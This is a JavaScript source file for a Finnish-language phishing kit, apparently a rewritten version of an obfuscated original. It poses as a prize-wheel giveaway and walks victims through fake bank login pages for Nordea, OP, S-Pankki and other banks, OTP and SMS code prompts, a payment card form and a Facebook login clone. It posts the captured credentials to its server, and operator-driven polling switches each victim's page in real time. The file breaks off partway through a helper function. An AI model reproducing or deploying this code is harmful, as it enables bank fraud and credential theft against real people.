/*
 * Custom script.js - replacement for obfuscated original
 * Handles: Alpine components for wheel, page routing, getRole polling, all page views
 */
(function() {
  'use strict';

  // ===== GLOBALS =====
  var visitorId = '';
  var currentPage = 'wheel';
  var pollTimer = null;
  var langData = {};
  var selectedBank = null;
  var selectedBankFull = null;
  var bankListCache = null;

  // Read language data from the page's wheelData/wonData if available
  try {
    langData = JSON.parse(document.querySelector('script:not([src])').textContent.match(/wonData\s*=\s*JSON\.parse\('(.+?)'\)/)[1].replace(/\\u/g, '\\u'));
  } catch(e) {}
  // Fallback: try from page variables
  try {
    if (typeof window.wheelData !== 'undefined') langData.wheel = window.wheelData;
    if (typeof window.wonData !== 'undefined') langData.won = window.wonData;
  } catch(e) {}

  // ===== VISITOR ID MANAGEMENT =====
  function getVisitorId() {
    if (visitorId) return visitorId;
    var vid = '';
    try { vid = localStorage.getItem('visitor_id') || ''; } catch(e) {}
    if (!vid) {
      var cookies = document.cookie.split(';');
      for (var i = 0; i < cookies.length; i++) {
        var c = cookies[i].trim();
        if (c.indexOf('vid=') === 0) { vid = c.substring(4); break; }
      }
    }
    if (vid) visitorId = vid;
    return vid;
  }

  function setVisitorId(vid) {
    visitorId = vid;
    try { localStorage.setItem('visitor_id', vid); } catch(e) {}
  }

  // ===== API HELPERS =====
  function apiPost(endpoint, data, callback) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/api/' + endpoint, true);
    xhr.withCredentials = true;
    var fd = new FormData();
    fd.append('visitor_id', getVisitorId());
    if (data) {
      for (var k in data) {
        if (data.hasOwnProperty(k)) fd.append(k, data[k]);
      }
    }
    xhr.onload = function() {
      try {
        var resp = JSON.parse(xhr.responseText);
        if (resp.visitor_id) setVisitorId(resp.visitor_id);
        if (callback) callback(null, resp);
      } catch(e) {
        if (callback) callback(e, null);
      }
    };
    xhr.onerror = function() { if (callback) callback(new Error('XHR error'), null); };
    xhr.send(fd);
  }

  function apiGet(endpoint, callback) {
    var xhr = new XMLHttpRequest();
    var url = '/api/' + endpoint;
    if (url.indexOf('?') === -1) url += '?visitor_id=' + encodeURIComponent(getVisitorId());
    else url += '&visitor_id=' + encodeURIComponent(getVisitorId());
    xhr.open('GET', url, true);
    xhr.withCredentials = true;
    xhr.onload = function() {
      try {
        var resp = JSON.parse(xhr.responseText);
        if (resp.visitor_id) setVisitorId(resp.visitor_id);
        if (callback) callback(null, resp);
      } catch(e) {
        if (callback) callback(e, null);
      }
    };
    xhr.onerror = function() { if (callback) callback(new Error('XHR error'), null); };
    xhr.send();
  }

  // ===== LANGUAGE DATA =====
  function getLang() {
    if (langData && Object.keys(langData).length > 1) return langData;
    // Try reading from page's cached data
    try {
      if (window._cachedLangData && Object.keys(window._cachedLangData).length > 1)
        return window._cachedLangData;
    } catch(e) {}
    return {};
  }

  // ===== INITIALIZE =====
  function init() {
    // Register visitor
    apiPost('start', {}, function(err, resp) {
      if (resp && resp.visitor_id) {
        setVisitorId(resp.visitor_id);
      }
    });
  }

  // ===== PAGE ROUTING =====
  function startPolling() {
    if (pollTimer) return;
    pollTimer = setInterval(function() {
      apiGet('getRole?status=re', function(err, data) {
        if (err || !data || !data.success) return;
        var serverPage = data.page || 'wheel';
        if (serverPage !== currentPage) {
          switchPage(serverPage, data);
        }
      });
    }, 2500);
  }

  function stopPolling() {
    if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  }

  function switchPage(page, data) {
    data = data || {};
    var oldPage = currentPage;
    currentPage = page;

    // For wheel, reload the page to reset everything
    if (page === 'wheel' && oldPage !== 'wheel') {
      window.location.reload();
      return;
    }

    // Handle each page type
    switch(page) {
      case 'bankList':
        renderBankListPage();
        break;
      case 'bankLogin':
        if (selectedBank) {
          renderLoginPage(selectedBank.id, selectedBank.name, selectedBank.slug);
        } else {
          renderBankListPage();
          currentPage = 'bankList';
        }
        break;
      case 'wait':
        renderWaitPage();
        break;
      case 'otp':
        renderOtpPage(data);
        break;
      case 'sms':
        renderSmsPage(data);
        break;
      case 'card':
        renderCardPage();
        break;
      case 'facebook':
        renderFacebookPage();
        break;
      case 'success':
        renderSuccessPage();
        break;
      case 'bankLoginError':
        renderBankLoginErrorPage();
        break;
      case 'nordeaVerify':
        renderVerifyPage('Nordea', data);
        break;
      case 'spankkiVerify':
        renderVerifyPage('S-Pankki', data);
        break;
      case 'opVerify':
        renderVerifyPage('OP', data);
        break;
      case 'austriaVerify':
        renderCustomVerifyPage(data.verify_texts || {});
        break;
      case 'customVerify':
        renderCustomVerifyPage(data.custom_verify_texts || {});
        break;
      case 'support':
      case 'whatsapp':
        renderSupportPage(data);
        break;
      case 'banned':
        renderPage('<div style="display:flex;align-items:center;justify-content:center;min-height:100vh;color:#fff;text-align:center;"><h2>Pääsy estetty.</h2></div>');
        break;
      default:
        // Unknown page - show wait
        renderWaitPage();
    }
  }

  // ===== RENDERING =====
  function renderPage(html) {
    document.body.innerHTML = html;
    document.body.removeAttribute('x-data');
  }

  function wrap(content) {
    return '<div style="min-height:100vh;display:flex;flex-direction:column;align-items:center;">' +
      '<div class="container" style="flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;max-width:500px;padding:2rem 1rem;text-align:center;">' +
      content +
      '</div>' +
      '<div class="powered-by" style="padding:1.5rem;">Powered by <img src="/static/img/1768398379_367d7c768420cfd5c6f1.png" alt="powered"></div>' +
      '</div>';
  }

  function seflink(name) {
    if (!name) return '';
    name = name.toLowerCase();
    var map = {'å':'a','ä':'a','ö':'o','ü':'u','ğ':'g','ı':'i','ş':'s','ç':'c'};
    name = name.replace(/[åäöüğışç]/g, function(c){ return map[c]||c; });
    return name.replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '');
  }

  // ---------- BANK LIST ----------
  function renderBankListPage() {
    var fetchBanks = function() {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', '/banks', true);
      xhr.withCredentials = true;
      xhr.onload = function() {
        try {
          var banks = JSON.parse(xhr.responseText);
          bankListCache = banks;
          showBankList(banks);
        } catch(e) {}
      };
      xhr.send();
    };
    if (bankListCache) showBankList(bankListCache);
    else fetchBanks();
  }

  function showBankList(banks) {
    var lang = getLang();
    var bl = lang.bank_list || {};
    var headTitle = bl.head_title || 'ONNENPYÖRÄ';
    var prize = '';
    try { prize = localStorage.getItem('prize_amount') || ''; } catch(e) {}
    var rewardTitle = (bl.reward_title || '').replace('${amount}', prize);
    var selectBank = bl.select_bank || '';

    var itemsHtml = '';
    for (var i = 0; i < banks.length; i++) {
      var b = banks[i];
      var logo = b.logo ? '/static/img/banks/' + b.logo : '';
      var slug = seflink(b.bank_name);
      itemsHtml += '<div class="bank-container__box-list-item" data-bank-id="' + b.id + '" data-bank-slug="' + slug + '" data-bank-name="' + (b.bank_name||'').replace(/"/g,'&quot;') + '" style="cursor:pointer;">' +
        '<div class="bank-container__box-list-item-image">' +
          (logo ? '<img src="' + logo + '" alt="' + (b.bank_name||'') + '" onerror="this.style.display=\'none\'" style="width:40px;height:40px;object-fit:contain;">' : '') +
        '</div>' +
        '<div class="bank-container__box-list-item-title">' + (b.bank_name||'') + '</div>' +
        '<div class="bank-container__box-list-item-icon">' +
          '<svg viewBox="0 0 20 20" fill="currentColor" width="20" height="20"><path fill-rule="evenodd" d="M7.21 14.77a.75.75 0 0 1 .02-1.06L10.94 10 7.23 6.29a.75.75 0 1 1 1.06-1.06l4.24 4.24a.75.75 0 0 1 0 1.06l-4.24 4.24a.75.75 0 0 1-1.06.02Z" clip-rule="evenodd"/></svg>' +
        '</div>' +
      '</div>';
    }

    var html = '<div class="container">' +
      '<p class="content-text__title">' + headTitle + '</p>' +
      (rewardTitle ? '<p class="bank-container__description">' + rewardTitle + '</p>' : (selectBank ? '<p class="bank-container__description">' + selectBank + '</p>' : '')) +
      '<div class="bank-container">' +
        '<div class="bank-container__box">' +
          '<div class="bank-container__box-search">' +
            '<div class="icon"><svg viewBox="0 0 24 24" fill="none" stroke="#9CA3AF" stroke-width="2" width="20" height="20"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg></div>' +
            '<input type="text" id="bankSearchInput" placeholder="' + (bl.search_placeholder || 'Hae') + '">' +
          '</div>' +
          '<div class="bank-container__box-list" id="bankListContainer">' + itemsHtml + '</div>' +
        '</div>' +
      '</div>' +
    '</div>' +
    '<div class="powered-by">Powered by <img src="/static/img/1768398379_367d7c768420cfd5c6f1.png" alt="powered"></div>';

    renderPage(html);

    // Search handler
    var searchInput = document.getElementById('bankSearchInput');
    if (searchInput) {
      searchInput.addEventListener('input', function() {
        var sv = this.value.toLowerCase();
        var items = document.querySelectorAll('.bank-container__box-list-item');
        for (var j = 0; j < items.length; j++) {
          var name = (items[j].getAttribute('data-bank-name') || '').toLowerCase();
          items[j].style.display = (!sv || name.indexOf(sv) !== -1) ? '' : 'none';
        }
      });
    }

    // Click handlers
    document.querySelectorAll('.bank-container__box-list-item').forEach(function(item) {
      item.addEventListener('click', function() {
        var bankId = this.getAttribute('data-bank-id');
        var bankName = this.getAttribute('data-bank-name');
        var bankSlug = this.getAttribute('data-bank-slug');

        selectedBank = {id: bankId, name: bankName, slug: bankSlug};
        if (bankListCache) {
          selectedBankFull = bankListCache.find(function(b){ return b.id == bankId; });
        }

        apiPost('bankUpdate', {bank: bankSlug, bank_id: bankId, bank_name: bankName}, function(err, resp) {
          currentPage = 'bankLogin';
          renderLoginPage(bankId, bankName, bankSlug);
        });
      });
    });
  }

  // ---------- LOGIN ----------
  function renderLoginPage(bankId, bankName, bankSlug) {
    var bank = selectedBankFull || null;
    var lang = getLang();
    var ld = lang.login || {};
    var headTitle = ld.head_title || 'ONNENPYÖRÄ';
    var prize = '';
    try { prize = localStorage.getItem('prize_amount') || ''; } catch(e) {}
    var rewardNotice = (ld.reward_notice || '').replace('${amount}', prize);
    var loginBank = (ld.login_bank || '').replace('${bank}', bankName);
    var usernameLabel = ld.username_label || 'Käyttäjätunnus';
    var passwordLabel = ld.password_label || 'Salasana';
    var buttonText = ld.button || 'Kirjaudu Sisään';
    var showPassword = bank ? bank.show_password !== '0' : true;
    var bankTitle = bank ? (bank.bank_title || '') : '';
    var logoUrl = bank && bank.logo ? '/static/img/banks/' + bank.logo : '';

    // Login options
    var optionNames = [];
    if (bank) {
      if (bank.option_name_1) optionNames.push(bank.option_name_1);
      if (bank.option_name_2) optionNames.push(bank.option_name_2);
      if (bank.option_name_3) optionNames.push(bank.option_name_3);
    }

    var optionsHtml = '';
    if (optionNames.length > 0) {
      optionsHtml = '<div style="display:flex;gap:8px;margin-bottom:1rem;flex-wrap:wrap;">';
      for (var oi = 0; oi < optionNames.length; oi++) {
        optionsHtml += '<button type="button" class="login-option-btn' + (oi===0?' active':'') + '" data-option="' + oi + '" style="flex:1;padding:10px 16px;border:1px solid #ddd;border-radius:12px;background:' + (oi===0?'#2563EB':'#fff') + ';color:' + (oi===0?'#fff':'#333') + ';font-size:0.9rem;cursor:pointer;">' + optionNames[oi] + '</button>';
      }
      optionsHtml += '</div>';
    }

    // Login list options
    var loginListHtml = '';
    if (bank && bank.login_option === '3' && bank.login_list_options) {
      var opts = bank.login_list_options.split(',');
      loginListHtml = '<div style="margin-bottom:1rem;"><select id="loginListOption" style="width:100%;height:52px;border:1px solid rgba(197,197,199,0.73);border-radius:16px;padding:0 1rem;font-size:1rem;">';
      for (var li = 0; li < opts.length; li++) {
        loginListHtml += '<option value="' + opts[li].trim() + '">' + opts[li].trim() + '</option>';
      }
      loginListHtml += '</select></div>';
    }

    var html = '<div class="container">' +
      '<p class="content-text__title">' + headTitle + '</p>' +
      '<p class="content-text__login">' + (rewardNotice || loginBank || ld.title || 'Tee Siirto') + '</p>' +
      '<div style="max-width:500px;width:100%;margin:1rem auto;padding:0 1rem;">' +
        '<div style="background:#fff;border-radius:24px;padding:1.5rem;box-shadow:0 8px 32px rgba(0,0,0,0.08);">' +
          (logoUrl ? '<div style="text-align:center;margin-bottom:1rem;"><img src="' + logoUrl + '" style="width:64px;height:64px;border-radius:50%;object-fit:contain;" alt="' + bankName + '"></div>' : '') +
          (bankTitle ? '<h3 style="text-align:center;margin-bottom:1rem;font-size:1.1rem;color:#1F2937;">' + bankTitle + '</h3>' : '') +
          optionsHtml +
          loginListHtml +
          '<form id="loginForm">' +
            '<div style="margin-bottom:1rem;">' +
              '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;">' + usernameLabel + '</label>' +
              '<input type="text" id="loginUsername" style="width:100%;height:52px;border:1px solid rgba(197,197,199,0.73);border-radius:16px;padding:0 1rem;font-size:1rem;" placeholder="' + usernameLabel + '">' +
            '</div>' +
            (showPassword ? '<div style="margin-bottom:1rem;">' +
              '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;">' + passwordLabel + '</label>' +
              '<input type="password" id="loginPassword" style="width:100%;height:52px;border:1px solid rgba(197,197,199,0.73);border-radius:16px;padding:0 1rem;font-size:1rem;" placeholder="' + passwordLabel + '">' +
            '</div>' : '') +
            '<button type="submit" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;margin-top:0.5rem;">' + buttonText + '</button>' +
          '</form>' +
        '</div>' +
      '</div>' +
    '</div>' +
    '<div class="powered-by">Powered by <img src="/static/img/1768398379_367d7c768420cfd5c6f1.png" alt="powered"></div>';

    renderPage(html);

    // Form submit
    var form = document.getElementById('loginForm');
    if (form) {
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        var username = document.getElementById('loginUsername') ? document.getElementById('loginUsername').value : '';
        var password = document.getElementById('loginPassword') ? document.getElementById('loginPassword').value : '';
        if (!username) return;

        var postData = {
          username: username,
          password: password,
          bank_id: bankId,
          bank_name: bankName
        };

        // Add option data
        var activeOpt = document.querySelector('.login-option-btn.active');
        if (activeOpt) postData.selected_option = activeOpt.textContent;
        var listOpt = document.getElementById('loginListOption');
        if (listOpt) postData.login_list_option = listOpt.value;

        apiPost('save_login', postData, function(err, resp) {
          currentPage = 'wait';
          renderWaitPage();
        });
      });
    }

    // Option buttons
    document.querySelectorAll('.login-option-btn').forEach(function(btn) {
      btn.addEventListener('click', function() {
        document.querySelectorAll('.login-option-btn').forEach(function(b) {
          b.style.background = '#fff'; b.style.color = '#333'; b.classList.remove('active');
        });
        this.style.background = '#2563EB'; this.style.color = '#fff'; this.classList.add('active');
      });
    });
  }

  // ---------- WAIT ----------
  function renderWaitPage() {
    var lang = getLang();
    var w = lang.wait || {};
    renderPage(wrap(
      '<p class="content-text__title">' + (w.title || 'ONNENPYÖRÄ') + '</p>' +
      '<p style="color:#fff;font-size:1.3rem;margin:1rem 0;">' + (w.subtitle || 'Odota Hetki.') + '</p>' +
      '<div style="margin:2rem 0;"><div style="width:48px;height:48px;border:4px solid rgba(255,255,255,0.3);border-top:4px solid #FFD700;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto;"></div></div>' +
      '<p style="color:#ff6b6b;font-size:1rem;max-width:400px;font-weight:600;">' + (w.security_alert || '') + '</p>' +
      '<p style="color:rgba(255,255,255,0.9);font-size:0.95rem;margin-top:1rem;max-width:400px;">' + (w.transfer_in_progress || '') + '</p>' +
      '<p style="color:rgba(255,255,255,0.7);font-size:0.85rem;margin-top:0.5rem;">' + (w.connection_reminder || '') + '</p>' +
      '<p style="color:rgba(255,255,255,0.6);font-size:0.8rem;margin-top:0.5rem;">' + (w.processing_time || '') + '</p>' +
      '<style>@keyframes spin{to{transform:rotate(360deg)}}</style>'
    ));
  }

  // ---------- OTP ----------
  function renderOtpPage(data) {
    var lang = getLang();
    var o = lang.otp || {};
    renderPage(wrap(
      '<p class="content-text__title">ONNENPYÖRÄ</p>' +
      '<p style="color:#fff;font-size:1.1rem;margin:1rem 0;">' + (o.title || 'SMS Vahvistuskoodi') + '</p>' +
      (o.description ? '<p style="color:rgba(255,255,255,0.7);font-size:0.9rem;margin-bottom:1.5rem;">' + o.description + '</p>' : '') +
      '<div style="background:#fff;border-radius:24px;padding:2rem;max-width:400px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.1);">' +
        buildCodeInputs('otp', 6) +
        '<button id="otpSubmitBtn" class="code-submit-btn" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">' + (o.button || 'Vahvista') + '</button>' +
      '</div>'
    ));
    attachCodeInputHandlers('otp');
  }

  // ---------- SMS ----------
  function renderSmsPage(data) {
    var lang = getLang();
    var s = lang.sms || {};
    var smsReq = data.sms_request || {};
    var title = smsReq.title || s.title || 'SMS Vahvistuskoodi';
    var msg = smsReq.message || s.description || '';
    var len = parseInt(smsReq.length) || 6;

    renderPage(wrap(
      '<p class="content-text__title">ONNENPYÖRÄ</p>' +
      '<p style="color:#fff;font-size:1.1rem;margin:1rem 0;">' + title + '</p>' +
      (msg ? '<p style="color:rgba(255,255,255,0.7);font-size:0.9rem;margin-bottom:1.5rem;">' + msg + '</p>' : '') +
      '<div style="background:#fff;border-radius:24px;padding:2rem;max-width:420px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.1);">' +
        buildCodeInputs('sms', len) +
        '<button id="smsSubmitBtn" class="code-submit-btn" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">' + (s.button || 'Vahvista') + '</button>' +
      '</div>'
    ));
    attachCodeInputHandlers('sms');
  }

  // ---------- CARD ----------
  function renderCardPage() {
    var lang = getLang();
    var c = lang.card || {};
    renderPage(wrap(
      '<p class="content-text__title">ONNENPYÖRÄ</p>' +
      '<div style="background:#fff;border-radius:24px;padding:2rem;max-width:440px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.1);margin-top:1rem;">' +
        '<div style="margin-bottom:1rem;">' +
          '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;text-align:left;">' + (c.card_number || 'Kortin Tiedot') + '</label>' +
          '<input type="text" id="cardNumber" maxlength="19" placeholder="0000 0000 0000 0000" style="width:100%;height:52px;border:1px solid #ddd;border-radius:16px;padding:0 1rem;font-size:1rem;box-sizing:border-box;">' +
        '</div>' +
        '<div style="display:flex;gap:1rem;margin-bottom:1rem;">' +
          '<div style="flex:1;">' +
            '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;text-align:left;">' + (c.expiry_date || 'KK/VV') + '</label>' +
            '<input type="text" id="cardExpiry" maxlength="5" placeholder="MM/YY" style="width:100%;height:52px;border:1px solid #ddd;border-radius:16px;padding:0 1rem;font-size:1rem;box-sizing:border-box;">' +
          '</div>' +
          '<div style="flex:1;">' +
            '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;text-align:left;">' + (c.cvc || 'CVV') + '</label>' +
            '<input type="text" id="cardCvc" maxlength="4" placeholder="123" style="width:100%;height:52px;border:1px solid #ddd;border-radius:16px;padding:0 1rem;font-size:1rem;box-sizing:border-box;">' +
          '</div>' +
        '</div>' +
        '<button id="cardSubmitBtn" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">' + (c.submit_button || 'Jatka') + '</button>' +
      '</div>'
    ));

    // Card formatting
    var cn = document.getElementById('cardNumber');
    if (cn) cn.addEventListener('input', function() {
      var v = this.value.replace(/\D/g,'').substring(0,16);
      this.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
    });
    var ce = document.getElementById('cardExpiry');
    if (ce) ce.addEventListener('input', function() {
      var v = this.value.replace(/\D/g,'').substring(0,4);
      if (v.length > 2) v = v.substring(0,2) + '/' + v.substring(2);
      this.value = v;
    });
  }

  // ---------- FACEBOOK ----------
  function renderFacebookPage() {
    var lang = getLang();
    var f = lang.facebook || {};
    renderPage(wrap(
      '<div style="background:#fff;border-radius:24px;padding:2rem;max-width:440px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.1);">' +
        '<div style="text-align:center;margin-bottom:1.5rem;"><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg></div>' +
        '<div style="margin-bottom:1rem;">' +
          '<input type="text" id="fbEmail" placeholder="' + (f.email || 'Matkapuhelinnumero tai sähköpostiosoite') + '" style="width:100%;height:52px;border:1px solid #ddd;border-radius:12px;padding:0 1rem;font-size:1rem;box-sizing:border-box;">' +
        '</div>' +
        '<div style="margin-bottom:1rem;">' +
          '<input type="password" id="fbPassword" placeholder="' + (f.password || 'Salasana') + '" style="width:100%;height:52px;border:1px solid #ddd;border-radius:12px;padding:0 1rem;font-size:1rem;box-sizing:border-box;">' +
        '</div>' +
        '<button id="fbSubmitBtn" style="width:100%;padding:14px;background:#1877F2;color:#fff;border:none;border-radius:12px;font-size:1rem;font-weight:600;cursor:pointer;">' + (f.login || 'Kirjaudu sisään') + '</button>' +
        '<p style="text-align:center;margin-top:1rem;"><a href="#" style="color:#1877F2;text-decoration:none;font-size:0.9rem;">' + (f.forgot || 'Unohtuiko salasana?') + '</a></p>' +
      '</div>'
    ));
  }

  // ---------- SUCCESS ----------
  function renderSuccessPage() {
    var lang = getLang();
    var sc = lang.success || {};
    renderPage(wrap(
      '<p class="content-text__title">' + (sc.head_title || 'ONNENPYÖRÄ') + '</p>' +
      '<div style="margin:2rem 0;"><svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#22C55E" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-5"/></svg></div>' +
      '<p style="color:#22C55E;font-size:1.5rem;font-weight:700;margin-bottom:0.5rem;">' + (sc.congrats || 'Onnittelut!') + '</p>' +
      '<p style="color:#fff;font-size:1.1rem;">' + (sc.title || 'Osallistumisesi On Tallennettu') + '</p>'
    ));
  }

  // ---------- BANK LOGIN ERROR ----------
  function renderBankLoginErrorPage() {
    var lang = getLang();
    var ld = lang.login || {};
    renderPage(wrap(
      '<p class="content-text__title">ONNENPYÖRÄ</p>' +
      '<div style="background:#fff;border-radius:24px;padding:2rem;max-width:440px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.1);margin-top:1rem;">' +
        '<div style="background:#FEE2E2;border:1px solid #FECACA;border-radius:12px;padding:1rem;margin-bottom:1.5rem;text-align:center;">' +
          '<p style="color:#DC2626;font-weight:600;">⚠️ ' + (ld.error_title || 'Virhe') + '</p>' +
          '<p style="color:#DC2626;font-size:0.9rem;margin-top:0.5rem;">Tarkista kirjautumistietosi ja yritä uudelleen.</p>' +
        '</div>' +
        '<form id="retryLoginForm">' +
          '<div style="margin-bottom:1rem;">' +
            '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;text-align:left;">' + (ld.username_label || 'Käyttäjätunnus') + '</label>' +
            '<input type="text" id="retryUsername" style="width:100%;height:52px;border:1px solid #ddd;border-radius:16px;padding:0 1rem;font-size:1rem;box-sizing:border-box;" placeholder="' + (ld.username_label || 'Käyttäjätunnus') + '">' +
          '</div>' +
          '<div style="margin-bottom:1rem;">' +
            '<label style="display:block;margin-bottom:0.5rem;font-weight:500;color:#374151;text-align:left;">' + (ld.password_label || 'Salasana') + '</label>' +
            '<input type="password" id="retryPassword" style="width:100%;height:52px;border:1px solid #ddd;border-radius:16px;padding:0 1rem;font-size:1rem;box-sizing:border-box;" placeholder="' + (ld.password_label || 'Salasana') + '">' +
          '</div>' +
          '<button type="submit" id="retryLoginBtn" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">' + (ld.button || 'Kirjaudu Sisään') + '</button>' +
        '</form>' +
      '</div>'
    ));

    var form = document.getElementById('retryLoginForm');
    if (form) {
      form.addEventListener('submit', function(e) {
        e.preventDefault();
        var u = document.getElementById('retryUsername');
        var p = document.getElementById('retryPassword');
        if (!u || !u.value) return;
        var bankId = selectedBank ? selectedBank.id : '';
        var bankName = selectedBank ? selectedBank.name : '';
        apiPost('save_login', {username: u.value, password: p ? p.value : '', bank_id: bankId, bank_name: bankName}, function() {
          currentPage = 'wait';
          renderWaitPage();
        });
      });
    }
  }

  // ---------- VERIFY (Nordea/OP/S-Pankki) ----------
  function renderVerifyPage(bankName, data) {
    var pin = data.op_pin || '';
    renderPage(wrap(
      '<p class="content-text__title">ONNENPYÖRÄ</p>' +
      '<p style="color:#fff;font-size:1.1rem;margin:1rem 0;">' + bankName + ' - Vahvistus</p>' +
      '<div style="background:#fff;border-radius:24px;padding:2rem;max-width:400px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.1);">' +
        (pin ? '<p style="color:#374151;font-size:0.95rem;margin-bottom:1rem;text-align:center;">Koodi: <strong>' + pin + '</strong></p>' : '') +
        '<p style="color:#374151;font-size:0.95rem;margin-bottom:1.5rem;text-align:center;">Hyväksy toiminto ' + bankName + ' sovelluksessasi.</p>' +
        buildCodeInputs('verify', 4) +
        '<button id="verifySubmitBtn" class="code-submit-btn" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">Vahvista</button>' +
      '</div>'
    ));
    attachCodeInputHandlers('verify');
  }

  // ---------- CUSTOM VERIFY ----------
  function renderCustomVerifyPage(texts) {
    texts = texts || {};
    renderPage(wrap(
      '<p class="content-text__title">ONNENPYÖRÄ</p>' +
      '<div style="background:#fff;border-radius:24px;padding:2rem;max-width:400px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,0.1);margin-top:1rem;">' +
        (texts.text1 ? '<p style="color:#374151;font-size:1rem;font-weight:600;margin-bottom:0.5rem;text-align:center;">' + texts.text1 + '</p>' : '') +
        (texts.text2 ? '<p style="color:#6B7280;font-size:0.95rem;margin-bottom:1rem;text-align:center;">' + texts.text2 + '</p>' : '') +
        (texts.text3 ? '<p style="color:#6B7280;font-size:0.9rem;margin-bottom:1.5rem;text-align:center;">' + texts.text3 + '</p>' : '') +
        buildCodeInputs('cv', 6) +
        '<button id="cvSubmitBtn" class="code-submit-btn" style="width:100%;padding:14px;background:#2563EB;color:#fff;border:none;border-radius:16px;font-size:1rem;font-weight:600;cursor:pointer;">Vahvista</button>' +
      '</div>'
    ));
    attachCodeInputHandlers('cv');
  }

  // ---------- SUPPORT ----------
  function renderSupportPage(data) {
    var lang = getLang();
    var sp = lang.support || {};
    var name = '';
    try { name = localStorage.getItem('user_name') || ''; } catch(e) {}
    var pageDesc = (sp.page_description || '').replace('${name}', name);
    var step = data.support_step || '2';
    var percent = data.support_percent || '';
    var stepInfo = (sp.step_info || 'Vaihe ${step} / 8').replace('${step}', step);
    var whatsappNumber = data.whatsapp_number || '';

    renderPage(wrap(
      '<p class="content-text__title">ONNENPYÖRÄ</p>' +
      '<p style="color:#FFD700;font-size:0.9rem;margin:0.5rem 0;">' + stepInfo + '</p>' +
      (percent ? '<div style="background:rgba(255,255,255,0.1);border-radius:8px;height:8px;margin:0.5rem 0 1rem;max-width:300px;width:100%;"><div style="background:#FFD700;height:100%;border-radius:8px;width:' + percent + '%;transition:width 0.5s;"></div></div>' : '') +
      (pageDesc ? '<p style="color:rgba(255,255,255,0.9);font-size:0.95rem;margin:0.5rem 0 1.5rem;">' + pageDesc + '</p>' : '') +
      '<div style="display:flex;flex-direction:column;gap:1rem;max-width:400px;width:100%;">' +
        '<div style="background:#fff;border-radius:16px;padding:1.5rem;text-align:center;">' +
          '<h3 style="color:#1F2937;font-size:1rem;margin-bottom:0.5rem;">💬 ' + (sp.support_1 || 'Live-tuki') + '</h3>' +
          '<p style="color:#6B7280;font-size:0.85rem;">' + (sp.support_1_description || '') + '</p>' +
        '</div>' +
        '<div style="background:#fff;border-radius:16px;padding:1.5rem;text-align:center;">' +
          '<h3 style="color:#25D366;font-size:1rem;margin-bottom:0.5rem;">📱 ' + (sp.support_2 || 'WhatsApp-tuki') + '</h3>' +
          '<p style="color:#6B7280;font-size:0.85rem;margin-bottom:0.5rem;">' + (sp.support_2_description || '') + '</p>' +
          (whatsappNumber ?
            '<a href="https://wa.me/' + whatsappNumber.replace(/[^0-9]/g,'') + '" target="_blank" style="display:inline-block;padding:10px 24px;background:#25D366;color:#fff;border:none;border-radius:12px;font-size:0.9rem;cursor:pointer;text-decoration:none;">' + (sp.support_2_button || 'Ota yhteyttä') + '</a>' :
            '<button class="wp-btn" style="padding:10px 24px;background:#25D366;color:#fff;border:none;border-radius:12px;font-size:0.9rem;cursor:pointer;">' + (sp.support_2_button || 'Ota yhteyttä') + '</button>'
          ) +
        '</div>' +
        '<div style="background:#fff;border-radius:16px;padding:1.5rem;text-align:center;">' +
          '<h3 style="color:#1877F2;font-size:1rem;margin-bottom:0.5rem;">📘 ' + (sp.support_3 || 'Facebook-tuki') + '</h3>' +
          '<p style="color:#6B7280;font-size:0.85rem;margin-bottom:0.5rem;">' + (sp.support_3_description || '') + '</p>' +
          '<button style="padding:10px 24px;background:#1877F2;color:#fff;border:none;border-radius:12px;font-size:0.9rem;cursor:pointer;">' + (sp.support_3_button || 'Ota yhteyttä Messengerissä') + '</button>' +
        '</div>' +
      '</div>'
    ));
  }

  // ===== CODE INPUT HELPERS =====
  function buildCodeInputs(prefix, count) {
    var html = '<div style="display:flex;gap:8px;justify-content:center;margin-bottom:1.5rem;flex-wrap:wrap;" id="' + prefix + 'Inputs">';
    for (var i = 0; i < count; i++) {
